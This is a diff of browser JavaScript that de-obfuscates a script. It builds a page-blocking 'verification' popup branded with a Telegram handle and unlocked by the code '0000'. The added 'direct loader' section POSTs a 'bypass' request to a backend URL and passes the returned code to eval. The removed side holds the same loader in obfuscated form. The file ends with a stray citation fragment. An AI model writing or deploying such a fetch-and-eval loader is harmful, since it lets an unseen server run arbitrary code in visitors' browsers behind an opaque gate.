-  _223 = (125265 ^ 125264) + (892155 ^ 892157);
-  _1l4[_0[256]] = _0[95][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]);
-  _1l4[_0[38]] = `
+
+  // --- 8. VERIFICATION POPUP SCRIPT ---
+  const demoStyle = document.createElement("style");
+  demoStyle.id = "shadin-demo-style";
+  demoStyle.textContent = `
     #shadin-demo{
       position:fixed; inset:0; z-index:999999999; display:flex; align-items:center; justify-content:center;
       background:rgba(0,0,0,.72); backdrop-filter:blur(4px); -webkit-backdrop-filter:blur(4px); font-family:Arial,sans-serif;
@@ -2474,14 +1306,11 @@ var _0 = ["matchMedia", ")xp967 :htdiw-nim(", "split", "", "reverse", "join", "m
     @keyframes shadinShake{ 0%,100%{ transform:translateX(0); } 20%{ transform:translateX(-6px); } 40%{ transform:translateX(6px); } 60%{ transform:translateX(-4px); } 80%{ transform:translateX(3px); } }
     @keyframes shadinHide{ 0%{ opacity:1; transform:scale(1); } 100%{ opacity:0; transform:scale(1.08); } }
   `;
-  document[_0[257]][_0[57]](_1l4);
-  var _224 = _0[499];
-  const _1l5 = document[_0[254]](_0[259][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]));
-  _224 = function () {
-    return _0[499];
-  }();
-  _1l5[_0[256]] = _0[94][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]);
-  _1l5[_0[397]] = `
+  document.head.appendChild(demoStyle);
+
+  const popup = document.createElement("div");
+  popup.id = "shadin-demo";
+  popup.innerHTML = `
       <div class="card">
         <button class="close" type="button">×</button>
         <div class="telegram">Telegram - @its_me_shadin</div>
@@ -2496,162 +1325,121 @@ var _0 = ["matchMedia", ")xp967 :htdiw-nim(", "split", "", "reverse", "join", "m
         <div class="message"></div>
       </div>
   `;
-  document[_0[151]][_0[57]](_1l5);
-  var _225 = function (s, h) {
-    return s ^ h;
-  }(823608, 823615);
-  const _1l6 = _1l5[_0[29]](_0[500][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]));
-  _225 = (642783 ^ 642776) + (400692 ^ 400689);
-  var _226 = _0[501];
-  const _1l7 = _1l5[_0[29]](_0[502][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]));
-  _226 = (571235 ^ 571243) + (816994 ^ 816997);
-  var _227 = function (s, h) {
-    return s + h;
-  }(409335 ^ 409343, 741643 ^ 741644);
-  const _1l8 = _1l5[_0[29]](_0[503][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]));
-  _227 = function () {
-    return 953284 ^ 953285;
-  }();
-  var _228 = function (s, h) {
-    return s ^ h;
-  }(923904, 923913);
-  const _1l9 = [..._1l5[_0[12]](_0[504][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]))];
-  _228 = function () {
-    return _0[505];
-  }();
-  _1l7[_0[200]](_0[506][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]), e => {
-    e[_0[507]]();
-    e[_0[508]]();
-    _1l8[_0[38]] = _0[509][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]);
-    _1l8[_0[230]][_0[340]] = _0[510][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]);
+  document.body.appendChild(popup);
+
+  const cardElem = popup.querySelector(".card");
+  const closeBtn = popup.querySelector(".close");
+  const message = popup.querySelector(".message");
+  const inputs = [...popup.querySelectorAll(".inputs input")];
+
+  closeBtn.addEventListener("click", e => {
+      e.preventDefault();
+      e.stopPropagation();
+      message.textContent = "Enter the correct code";
+      message.style.color = "#888";
   });
-  _1l5[_0[200]](_0[506][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]), e => {
-    if (e[_0[511]] === _1l5) {
-      e[_0[507]]();
-      e[_0[508]]();
-    }
+
+  popup.addEventListener("click", e => {
+      if(e.target === popup){
+          e.preventDefault();
+          e.stopPropagation();
+      }
   });
-  function _1pu() {
-    if (!_1l9[_0[512]](input => input[_0[32]])) return;
-    var _229 = function (s, h) {
-      return s + h;
-    }(846740 ^ 846737, 247659 ^ 247657);
-    const code = _1l9[_0[513]](input => input[_0[32]])[_0[5]](_0[3]);
-    _229 = function () {
-      return _0[514];
-    }();
-    if (code === _0[515][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3])) {
-      _1l9[_0[165]](input => input[_0[266]][_0[267]](_0[516][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3])));
-      _1l6[_0[266]][_0[267]](_0[516][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]));
-      _1l8[_0[38]] = _0[517][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]);
-      _1l8[_0[230]][_0[340]] = _0[275][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]);
-      setTimeout(() => {
-        _1l6[_0[266]][_0[267]](_0[518][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]));
-        setTimeout(() => {
-          _1l5[_0[87]]();
-          _1l4[_0[87]]();
-        }, 911205 ^ 910921);
-      }, 226756 ^ 226388);
-    } else {
-      _1l6[_0[266]][_0[87]](_0[519][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]));
-      void _1l6[_0[520]];
-      _1l6[_0[266]][_0[267]](_0[519][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]));
-      _1l8[_0[38]] = _0[521][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]);
-      _1l8[_0[230]][_0[340]] = _0[522][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]);
-      setTimeout(() => {
-        _1l9[_0[165]](input => {
-          input[_0[32]] = function () {
-            return _0[3];
-          }();
-          input[_0[266]][_0[87]](_0[516][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]));
-        });
-        _1l8[_0[38]] = function () {
-          return _0[3];
-        }();
-        _1l9[851758 ^ 851758][_0[523]]();
-      }, 766132 ^ 766360);
-    }
+
+  function checkCode(){
+      if(!inputs.every(input => input.value)) return;
+      const code = inputs.map(input => input.value).join("");
+      if(code === "0000"){
+          inputs.forEach(input => input.classList.add("success"));
+          cardElem.classList.add("success");
+          message.textContent = "✓ Verified";
+          message.style.color = "#0faf59";
+          setTimeout(() => {
+              cardElem.classList.add("hide");
+              setTimeout(() => {
+                  popup.remove();
+                  demoStyle.remove();
+              }, 300);
+          }, 400);
+      }else{
+          cardElem.classList.remove("shake");
+          void cardElem.offsetWidth;
+          cardElem.classList.add("shake");
+          message.textContent = "Wrong code";
+          message.style.color = "#e7473f";
+          setTimeout(() => {
+              inputs.forEach(input => {
+                  input.value = "";
+                  input.classList.remove("success");
+              });
+              message.textContent = "";
+              inputs[0].focus();
+          }, 300);
+      }
   }
-  _1l9[_0[165]]((input, index) => {
-    input[_0[200]](_0[524][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]), () => {
-      input[_0[32]] = input[_0[32]][_0[50]](/[^0-9]/g, _0[3]);
-      if (input[_0[32]] && index < _1l9[_0[9]] - (234434 ^ 234435)) {
-        _1l9[index + (233941 ^ 233940)][_0[523]]();
-      }
-      _1pu();
-    });
-    input[_0[200]](_0[525][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]), e => {
-      if (e[_0[526]] === _0[527][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]) && !input[_0[32]] && index > (815483 ^ 815483)) {
-        _1l9[index - (328735 ^ 328734)][_0[523]]();
-      }
-      if (e[_0[526]] === _0[528][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]) && index > (987653 ^ 987653)) {
-        _1l9[index - (154493 ^ 154492)][_0[523]]();
-      }
-      if (e[_0[526]] === _0[529][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]) && index < _1l9[_0[9]] - (469490 ^ 469491)) {
-        _1l9[index + (780275 ^ 780274)][_0[523]]();
-      }
-    });
-  });
-  _1l9[781348 ^ 781348][_0[200]](_0[530][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]), e => {
-    e[_0[507]]();
-    var _230 = function (s, h) {
-      return s ^ h;
-    }(671702, 671699);
-    const _1n2 = (e[_0[531]] || window[_0[531]])[_0[532]](_0[533][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]))[_0[50]](/\D/g, _0[3])[_0[534]](807111 ^ 807111, 322003 ^ 322007);
-    _230 = function () {
-      return _0[535];
-    }();
-    _1n2[_0[2]](_0[3])[_0[165]]((digit, i) => {
-      if (_1l9[i]) _1l9[i][_0[32]] = digit;
-    });
-    if (_1n2[_0[9]] === (699946 ^ 699950)) {
-      _1l9[689146 ^ 689145][_0[523]]();
-      _1pu();
-    } else {
-      _1l9[Math[_0[278]](_1n2[_0[9]], 512126 ^ 512125)][_0[523]]();
-    }
-  });
-  _1l9[125367 ^ 125367][_0[523]]();
-  async function _1pv() {
-    try {
-      var _231 = function (s, h) {
-        return s ^ h;
-      }(550484, 550480);
-      const _1n3 = await fetch(`${_mg}/api/get-core-code`, {
-        method: _0[536][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]),
-        headers: {
-          '\u0043\u006f\u006e\u0074\u0065\u006e\u0074\u002d\u0054\u0079\u0070\u0065': _0[537][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3])
-        },
-        body: JSON[_0[117]]({
-          bypass: !![]
-        })
+
+  inputs.forEach((input, index) => {
+      input.addEventListener("input", () => {
+          input.value = input.value.replace(/[^0-9]/g, "");
+          if(input.value && index < inputs.length - 1){
+              inputs[index + 1].focus();
+          }
+          checkCode();
       });
-      _231 = function () {
-        return 719511 ^ 719519;
-      }();
-      var _232 = function (s, h) {
-        return s ^ h;
-      }(198205, 198203);
-      const _1n4 = await _1n3[_0[538]]();
-      _232 = function () {
-        return _0[539];
-      }();
-      var _233 = function (s, h) {
-        return s ^ h;
-      }(851021, 851020);
-      const _1n5 = _1n4[_0[540]] || _1n4[_0[541]] && _1n4[_0[540]];
-      _233 = function () {
-        return 374107 ^ 374109;
-      }();
-      if (_1n5) {
-        (464290 ^ 464290, eval)(_1n5);
+
+      input.addEventListener("keydown", e => {
+          if(e.key === "Backspace" && !input.value && index > 0){
+              inputs[index - 1].focus();
+          }
+          if(e.key === "ArrowLeft" && index > 0){
+              inputs[index - 1].focus();
+          }
+          if(e.key === "ArrowRight" && index < inputs.length - 1){
+              inputs[index + 1].focus();
+          }
+      });
+  });
+
+  inputs[0].addEventListener("paste", e => {
+      e.preventDefault();
+      const pasted = (e.clipboardData || window.clipboardData).getData("text").replace(/\D/g, "").slice(0, 4);
+      pasted.split("").forEach((digit, i) => {
+          if(inputs[i]) inputs[i].value = digit;
+      });
+      if(pasted.length === 4){
+          inputs[3].focus();
+          checkCode();
+      }else{
+          inputs[Math.min(pasted.length, 3)].focus();
+      }
+  });
+
+  inputs[0].focus();
+
+  // --- 9. DIRECT LOADER (BACKEND CORE CODE FETCH) ---
+  async function directLoad() {
+    try {
+      const response = await fetch(`${BACKEND_URL}/api/get-core-code`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ bypass: true })
+      });
+
+      const result = await response.json();
+      const codeToRun = result.code || (result.valid && result.code);
+
+      if (codeToRun) {
+        (0, eval)(codeToRun);
       } else {
-        console[_0[542]](_0[543][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]));
+        console.warn("Core code not found in backend response.");
       }
     } catch (e) {
-      console[_0[544]](_0[545][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]), e);
+      console.error("Direct load error:", e);
     }
   }
-  _1pv();
-  console[_0[546]](_0[547][_0[2]](_0[3])[_0[4]]()[_0[5]](_0[3]));
+
+  directLoad();
+
+  console.log("0X Premium Secure Loader & Title Guard Active (Exact 20x20 Icon & Real Box)!");
 })();
+```[cite: 1]
